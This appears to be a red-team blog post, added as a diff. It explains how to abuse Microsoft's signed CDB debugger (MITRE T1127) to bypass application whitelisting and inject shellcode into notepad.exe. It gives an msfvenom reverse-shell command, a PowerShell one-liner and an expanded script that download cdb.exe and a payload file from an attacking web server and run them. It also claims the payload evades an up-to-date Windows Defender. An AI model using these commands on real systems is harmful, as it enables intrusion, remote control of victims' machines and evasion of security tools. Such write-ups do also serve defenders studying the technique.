@@ -1,0 +1,97 @@
+<h4 class="has-text-color has-text-align-center wp-block-heading" style="color:#a90c0c">Blog Preface &#8211; &#8220;Windows Kits&#8221;</h4>
+
+<p class="has-text-align-center wp-block-paragraph">While running through some MITRE techniques, I happened upon the ADK tools and SDK tools and found a great collection of programs used for development, debugging, and administration. It just so happens, they&#8217;re also great for Red Teaming. Many of them are Digitally Signed by Microsoft, making them a great bypass for Applocker / Application Whitelisting. </p>
+
+<div style="grid-template-columns:auto 37%"><figure><img width="796" height="164" src="/img/posts/2020-06-ATTCK_red.png" alt="" /></figure><div>
+<p class="has-large-font-size wp-block-paragraph">In this post, we&#8217;re expanding on the CDB.exe tool that we touched on in the last post. </p>
+</div></div>
+
+<h4 class="has-text-align-center wp-block-heading">T1127 &#8211; Trusted Developer Tools </h4>
+
+<h6 class="has-text-align-center wp-block-heading"><a href="https://attack.mitre.org/techniques/T1127/">https://attack.mitre.org/techniques/T1127</a></h6>
+
+<div style="height:20px" aria-hidden="true"></div>
+
+<p>There are a lot of tools within the realm of T1127, each worthy of review. I took an interest in this one because of its raw and simple power. With a little effort, I could use it to execute my own shell commands, and with a little more effort, my own shellcode. All of which flew under the nose of AV systems. </p>
+
+<div><div></div></div>
+
+<div>
+<div style="flex-basis:66.66%">
+<p>Cdb is a Console Debugger application that is digitally signed by Microsoft. As a debugger, it&#8217;s not hard to imagine why it&#8217;s so powerful. This is an application that is designed to inject into an attached process. We can abuse this to inject our own commands, including shells. </p>
+
+<p>True to this series, it was made available to me when I installed SDK and selected the option for Windows Debugger Kits. (See the last blog post for more info on this).</p>
+
+<p>I know myself well. There is a 0% chance I&#8217;m going to remember the syntax for this command. I&#8217;ll rarely use this, despite how powerful it could be. As a result, the best option is making it repeatable. Reading into the exploit technique, the article at exploit monday was the most helpful.</p>
+</div>
+
+<div style="flex-basis:33.33%">
+<ul><li>CDB<ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options</a></li></ul></li><li>Example PoC<ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options"></a><a href="http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html">http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a></li></ul></li></ul>
+</div>
+</div>
+
+<p>This tool accepts WDS file extensions, which are like debugger script files. The debugger commands can be scripted and executed with the right parameters. This makes it much easier. In the Exploit Monday PoC, we see shellcode that pops calc.</p>
+
+<p>At a basic level, the scripting language accepts the .shell command, which was an easy first step. The .shell command will allow me to execute Command Prompt shell commands directly. This is super easy, but still leaves a lot to be desired. Wouldn&#8217;t it be a lot cooler if we could put our shellcode in there? </p>
+
+<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-shell--command-shell-">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-shell&#8211;command-shell-</a></p>
+
+<p></p>
+
+<div style="grid-template-columns:auto 25%"><figure><img width="1024" height="915" src="/img/posts/2020-06-snake-312561_1280-1024x915.png" alt="" /></figure><div>
+<p class="has-large-font-size wp-block-paragraph">Time to write some python. </p>
+
+<p>A little google searching didn&#8217;t immediately turn anything up, so I decided to write up my own python script to convert msfvenom payloads into the correct format for WDS files. I&#8217;m a high-functioning idiot, so the python script only does the bare minimums. To use it, I take the python output from the msfvenom payload and paste it into my script. Then redirect the output from the script into a &#8220;payload.wds&#8221; file.</p>
+
+<p>I don&#8217;t really like snakes&#8230; so a doofus looking Python image is as good as we&#8217;re going to get here. </p>
+</div></div>
+
+<p>The version I&#8217;ve posted in my github (at the time of this writing) is lazy and only allocates enough memory space to place our shellcode. This works for some payloads, but it&#8217;s not going to work for everything. For example, meterpreter payloads are a little more dynamic, and the encoder for those payloads would decode and likely expand outside of our dedicated executable memory space causing it to fail. (or at least that&#8217;s my theory, which I&#8217;ll validate once I&#8217;m a little less lazy)</p>
+
+<p><a href="https://github.com/galoryber/MITRE/blob/master/cdb-t1127.py">https://github.com/galoryber/MITRE/blob/master/cdb-t1127.py</a></p>
+
+<div style="grid-template-columns:auto 30%"><figure style="background-image:url(/img/posts/2020-06-Screenshot-2020-06-24-at-11.37.12-AM.png);background-position:50% 50%"><img width="562" height="321" src="/img/posts/2020-06-Screenshot-2020-06-24-at-11.37.12-AM.png" alt="" /></figure><div>
+<p class="has-large-font-size wp-block-paragraph">In short, here is what is going on: </p>
+
+<p>We&#8217;re pasting the shellcode from msfvenom into the python script. I&#8217;m generating that with&#8230;</p>
+
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.20.30.40 LPORT=80 EXITFUNC=thread -f python -o /tmp/msfvenom.output</code></pre>
+
+<p>Once that&#8217;s pasted into our python script, the script will grab the payload length and allocate exactly that much RWX memory space. This is what should change for any dynamically expanding encodings. for now, I know this shell payload works statically, so I&#8217;m working with that. </p>
+
+<p>The next thing we&#8217;re doing is re-writing the python shellcode into the format that WDS expects. This is mostly just manipulation to match other PoCs, like the exploit monday example. </p>
+
+<p>The last three lines are simple. We just change the instruction pointer back over to our shellcode and tell the debugger to start execution, and then quit. These were just determined from the documentation for cdb.</p>
+</div></div>
+
+<p>The end result? All we really do is: Paste the msfvenom shellcode into the script, then run : </p>
+
+<pre><code>python3 poc.py >> payload.wds</code></pre>
+
+<p>That&#8217;s everything we need to execute. We have our PE cdb.exe and our payload.wds file. I choose to host these files on an attacking web server. The following powershell one liner will pull down and execute our payload.</p>
+
+<pre><code>$u = "http://10.30.1.17/";$f = "cdb.exe","payload.wds";$f | % {iwr -uri $u$_ -outf $env:TEMP\$_};sl $env:TEMP; .\cdb.exe -pd -cf .\payload.wds -o notepad.exe</code></pre>
+
+<p>The one liner could be shortened by renaming the EXE and WDS files to something like a.exe, in addition to injection into a process name that is shorter. When I write powershell, I prefer the full notation for readability, so here&#8217;s what we&#8217;re actually doing there. </p>
+
+<pre><code>$AttackingWebServer = "http://10.20.30.40/"
+$PayloadFiles = "CDB.exe","payload.wds"
+$PayloadFiles | Foreach-Object {
+     Invoke-WebRequest -uri $AttackingWebServer$_ -OutFile $env:TEMP\$_
+}
+Set-Location $env:TEMP
+.\CDB.exe -pd -cf .\payload.wds -o notepad.exe</code></pre>
+
+<p>Finally, the CDB command has a few parameters that we care about. The -pd tells the debugger to keep the process running after the debugger is stopped with the quit command. This allows our rev shell to continue operating after initial execution. </p>
+
+<p>The -cf tells the debugger to execute the commands found in our WDS file, so we follow this with the location of our payload.wds. </p>
+
+<p>Finally, -o this is the process that the debugger will open and attach to.</p>
+
+<div style="grid-template-columns:41% auto"><figure><img width="1024" height="653" src="/img/posts/2020-07-cards-161404_1280-1-1024x653.png" alt="" /></figure><div>
+<h3 class="has-secondary-color has-text-color wp-block-heading">I&#8217;ll take your RCE, and I&#8217;ll raise you a Reverse Shell</h3>
+</div></div>
+
+<p>We&#8217;ll use our powershell one-liner to pull the payload from an attacking web server, in this case, just a python SimpleHTTPServer. The attacking server also has a netcat listener running to receive the connection. The console on the left is an ssh session to the attacking server, and the console on the right is the victim powershell window. </p>
+
+<figure><video height="616" style="aspect-ratio: 1366 / 616;" width="1366" controls src="/media/2020-07-screencast-esx1-2020.07.06-20_37_27.webm"></video><figcaption>Video shows up-to-date Windows Defender, automatic sample submission turned off to avoid sending new payload experiments to MS. Inject shellcode into notepad process and observe the reverse shell connection. </figcaption></figure>
